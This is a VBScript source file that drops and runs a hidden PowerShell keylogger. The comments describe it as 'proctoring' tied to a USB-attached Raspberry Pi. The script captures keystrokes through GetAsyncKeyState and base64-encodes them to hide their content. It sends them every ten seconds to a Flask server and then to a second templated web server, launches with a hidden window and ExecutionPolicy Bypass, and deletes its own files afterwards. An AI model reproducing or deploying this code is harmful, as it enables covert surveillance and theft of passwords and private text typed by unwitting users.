' Initialize WScript Shell
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Parameters
Dim sending_base
sending_base = "{{SENDING_BASE}}"
Dim base_url
base_url = "{{BASE_URL}}"
Dim key
key = "{{KEY}}"

' Create a temporary PowerShell script with initial commands
Dim tempPSFilePath, cleanupPSFilePath
tempPSFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\temp_keystroke.ps1"
cleanupPSFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\cleanup.ps1"

' Create and write initial PowerShell script content
Dim fso, tempPSFile, cleanupPSFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set tempPSFile = fso.CreateTextFile(tempPSFilePath, True)

' Write PowerShell script content
tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("#                                                   Variables Definition")
tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("# Web server for processing string data")
tempPSFile.WriteLine("$sending_base = '" & sending_base & "'")
tempPSFile.WriteLine("# Webserver for getting public key")
tempPSFile.WriteLine("$key = '" & key & "'")
tempPSFile.WriteLine("$base_url = '" & base_url & "'")
tempPSFile.WriteLine("$cleanupScriptPath = '" & cleanupPSFilePath & "'")

tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("#                                                      Basic Functions")
tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("# Function: Determine if Raspberry Pi is connected to the PC")
tempPSFile.WriteLine("# Finding for USB with VID 1D6B. VID is the Vendor ID set by us when configuring composite mode on Raspberry Pi")
tempPSFile.WriteLine("function Is_Connected {")
tempPSFile.WriteLine("    $check = $null")
tempPSFile.WriteLine("    $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }")
tempPSFile.WriteLine("    if ($null -ne $check) { return 'FOUND' }")
tempPSFile.WriteLine("}")

tempPSFile.WriteLine("# Function: Encoding plaintext string to base64 encode so that the proctoring results are not so obvious when sending to Flask server")
tempPSFile.WriteLine("function Encode($data) {")
tempPSFile.WriteLine("    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))")
tempPSFile.WriteLine("}")

tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("#                                                    Initial Functions")
tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("# Retrieving public key from web server")
tempPSFile.WriteLine("$pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing")

tempPSFile.WriteLine("# Sending public key to Pi's Flask server in JSON format")
tempPSFile.WriteLine("$key_data = @{PuK = Encode($($pub_key.ToString()))}")
tempPSFile.WriteLine("# Result is the UUID")
tempPSFile.WriteLine("$completed = $false")

tempPSFile.WriteLine("if (Is_Connected -ne $null) {")
tempPSFile.WriteLine("    try {")
tempPSFile.WriteLine("        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'")
tempPSFile.WriteLine("        $uuid = ($response.content | ConvertFrom-Json).uuid")
tempPSFile.WriteLine("        $completed = $true")
tempPSFile.WriteLine("    } catch {}")
tempPSFile.WriteLine("} else {break}")

tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("#                                                      Keystroke Function")
tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
tempPSFile.WriteLine("function Capture_Keystrokes {")
tempPSFile.WriteLine("    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null")
tempPSFile.WriteLine("    $LogBuffer = @()")
tempPSFile.WriteLine("    $LastWriteTime = Get-Date")
tempPSFile.WriteLine("    $BatchInterval = 10  # seconds")
tempPSFile.WriteLine("    $KeyState = @{}  # Hash table to track pressed keys")
tempPSFile.WriteLine("    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')")
tempPSFile.WriteLine("    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)")
tempPSFile.WriteLine("    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)")
tempPSFile.WriteLine("    $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')")
tempPSFile.WriteLine("    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))")
tempPSFile.WriteLine("    $FieldArray = [Reflection.FieldInfo[]] @(")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),")
tempPSFile.WriteLine("        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')")
tempPSFile.WriteLine("    )")
tempPSFile.WriteLine("    $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))")
tempPSFile.WriteLine("    $FieldValueArray = [Object[]] @(")
tempPSFile.WriteLine("        'GetAsyncKeyState',")
tempPSFile.WriteLine("        $True,")
tempPSFile.WriteLine("        $False,")
tempPSFile.WriteLine("        $True,")
tempPSFile.WriteLine("        [Runtime.InteropServices.CallingConvention]::Winapi,")
tempPSFile.WriteLine("        [Runtime.InteropServices.CharSet]::Auto")
tempPSFile.WriteLine("    )")
tempPSFile.WriteLine("    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)")
tempPSFile.WriteLine("    $PInvokeMethod.SetCustomAttribute($CustomAttribute)")
tempPSFile.WriteLine("    $ImportDll = $TypeBuilder.CreateType()")

tempPSFile.WriteLine("    while (1) {")
tempPSFile.WriteLine("        for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++) {")
tempPSFile.WriteLine("            $VirtualKey = $TypeableChar")
tempPSFile.WriteLine("            $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)")

tempPSFile.WriteLine("            # If the key is pressed")
tempPSFile.WriteLine("            if (($KeyResult -band 0x8000) -eq 0x8000) {")
tempPSFile.WriteLine("                if (-not $KeyState.ContainsKey($VirtualKey) -or -not $KeyState[$VirtualKey]) {")
tempPSFile.WriteLine("                    $KeyState[$VirtualKey] = $true")

tempPSFile.WriteLine("                    # Log only alphanumeric characters")
tempPSFile.WriteLine("                    if ((($VirtualKey -ge 48 -and $VirtualKey -le 57) -or ($VirtualKey -ge 65 -and $VirtualKey -le 90) -or ($VirtualKey -ge 97 -and $VirtualKey -le 122))) {")
tempPSFile.WriteLine("                        $LogBuffer += [char]$VirtualKey")
tempPSFile.WriteLine("                    }")
tempPSFile.WriteLine("                }")
tempPSFile.WriteLine("            } else {")
tempPSFile.WriteLine("                $KeyState[$VirtualKey] = $false")
tempPSFile.WriteLine("            }")
tempPSFile.WriteLine("        }")

tempPSFile.WriteLine("        # Check connection status and send buffer every 10 seconds")
tempPSFile.WriteLine("        if ((Get-Date) -gt $LastWriteTime.AddSeconds($BatchInterval)) {")
tempPSFile.WriteLine("            if (Is_Connected -ne $null) {")
tempPSFile.WriteLine("                if ($LogBuffer.Length -gt 0) {")
tempPSFile.WriteLine("                    $LogBufferString = $LogBuffer -join ''")
tempPSFile.WriteLine("                    $encoded_content = Encode($LogBufferString)")
tempPSFile.WriteLine("                    $data = @{KS = $encoded_content}")
tempPSFile.WriteLine("                    $completed = $false")

tempPSFile.WriteLine("                    while (-not $completed) {")
tempPSFile.WriteLine("                        try {")
tempPSFile.WriteLine("                            $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'")
tempPSFile.WriteLine("                            Write-Host 'Sending data'")
tempPSFile.WriteLine("                            # Sending data to Webserver")
tempPSFile.WriteLine("                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content | ConvertTo-Json) -ContentType 'application/json'")
tempPSFile.WriteLine("                            $completed = $true")
tempPSFile.WriteLine("                        } catch {}")
tempPSFile.WriteLine("                    }")

tempPSFile.WriteLine("                    # Clear the buffer")
tempPSFile.WriteLine("                    $LogBuffer = @()")
tempPSFile.WriteLine("                    $LastWriteTime = Get-Date")
tempPSFile.WriteLine("                }")
tempPSFile.WriteLine("            } else {break}")
tempPSFile.WriteLine("        }")
tempPSFile.WriteLine("    }")
tempPSFile.WriteLine("    # Schedule the cleanup background job")
tempPSFile.WriteLine("    Start-Process -NoNewWindow -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File """ & cleanupPSFilePath & """'")
tempPSFile.WriteLine("}")
tempPSFile.WriteLine("# Start the keystroke capturing function in the foreground")
tempPSFile.WriteLine("Capture_Keystrokes")

tempPSFile.Close()

' Create the cleanup PowerShell script content
Set cleanupPSFile = fso.CreateTextFile(cleanupPSFilePath, True)
cleanupPSFile.WriteLine("$scriptPath = '" & tempPSFilePath & "'")
cleanupPSFile.WriteLine("$cleanupScriptPath = '" & cleanupPSFilePath & "'")
cleanupPSFile.WriteLine("Start-Sleep -Seconds 5")  ' Wait for the main script to finish
cleanupPSFile.WriteLine("Remove-Item -Path $scriptPath -Force")
cleanupPSFile.WriteLine("Remove-Item -Path $cleanupScriptPath -Force")
cleanupPSFile.Close()

' Run the PowerShell script hidden
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPSFilePath & """", 0

Set objShell = Nothing
Set fso = Nothing
Set tempPSFile = Nothing